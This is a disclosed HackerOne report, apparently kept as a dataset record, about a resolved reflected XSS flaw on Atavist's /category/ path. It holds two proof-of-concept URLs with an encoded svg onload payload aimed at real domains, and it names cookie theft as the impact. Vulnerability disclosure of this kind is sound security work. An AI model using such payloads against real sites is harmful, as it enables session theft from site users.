---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '950845'
original_report_id: '950845'
title: Reflected XSS at /category/ on a Atavis theme
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: automattic
created_at: '2020-08-04T12:37:56.944Z'
disclosed_at: '2020-11-18T14:22:03.590Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS at /category/ on a Atavis theme

## Metadata

- HackerOne Report ID: 950845
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: automattic
- Disclosed At: 2020-11-18T14:22:03.590Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Hi team,
This report is similar to #947790
You fixed the XSS on search, but I found another XSS at `/category/xsspayload`

For PoC you can check these URLs :
https://magazine.atavist.com/category/%22%3E%3Csvg%20onload%3Dalert%60XSS%60%3E
https://docs.atavist.com/category/%22%3E%3Csvg%20onload%3Dalert%60XSS%60%3E

You can encode " ' < > characters with HTML encoding in this endpoint.

## Impact

Reflected XSS - cookie stealing

Thanks,
Bugra

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
